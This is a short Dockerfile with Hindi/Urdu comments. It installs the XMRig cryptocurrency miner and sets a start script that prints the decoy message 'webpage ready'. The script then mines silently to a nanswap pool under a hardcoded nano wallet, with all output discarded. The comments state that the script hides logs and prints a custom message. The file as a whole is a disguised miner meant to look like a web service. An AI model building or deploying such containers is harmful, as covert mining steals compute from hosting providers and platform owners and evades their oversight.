FROM ubuntu:22.04

# Zaroori tools install karein
RUN apt-get update && \
    apt-get install -y wget tar && \
    rm -rf /var/lib/apt/lists/*

# XMRig ka latest version download aur extract karein
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x64.tar.gz && \
    tar -xvf xmrig-6.21.3-linux-x64.tar.gz && \
    mv xmrig-6.21.3/xmrig /usr/local/bin/xmrig && \
    rm -rf xmrig-6.21.3*

# Start script banayein jo logs hide karega aur custom message print karega
RUN echo '#!/bin/bash\n\
echo "webpage ready"\n\
xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_1htswdqqdeg7re8eaqremy1c6gut9p7td1pskkdb3dn5skxs8fkkawyrg38r -p x > /dev/null 2>&1\n\
' > /start.sh && chmod +x /start.sh

CMD ["/start.sh"]
